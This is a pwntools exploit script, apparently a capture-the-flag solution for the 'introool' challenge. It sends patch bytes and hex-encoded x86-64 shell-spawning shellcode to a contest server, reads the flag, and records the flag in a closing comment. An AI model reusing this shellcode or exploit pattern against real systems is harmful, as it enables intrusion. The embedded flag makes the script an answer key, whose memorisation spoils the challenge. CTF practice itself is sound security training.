from pwn import *
from base64 import b64decode

p = remote('introool.challenges.ooo', 4242)

p.recvuntil('> ')
p.sendline('90')

p.recvuntil('> ')
p.sendline('80')

p.recvuntil(': ')
p.sendline('78')
p.recvuntil(': ')
p.sendline('eb')

p.recvuntil(': ')
p.sendline('79')
p.recvuntil(': ')
p.sendline('4a')

p.recvuntil('> ')
p.sendline('31c05048bb2f6269')
p.recvuntil('> ')
p.sendline('6e2f2f7368534889')
p.recvuntil('> ')
p.sendline('e7b03b0f05909090')

p.recvuntil('> ')
p.sendline('2')

#with open('binary', 'wb') as f:
#    f.write(b64decode(p.readall()))

p.sendline('cat flag')
print(p.recvregex("OOO{.*}"))

# OOO{the_damn_loader_screwed_me_up_once_again}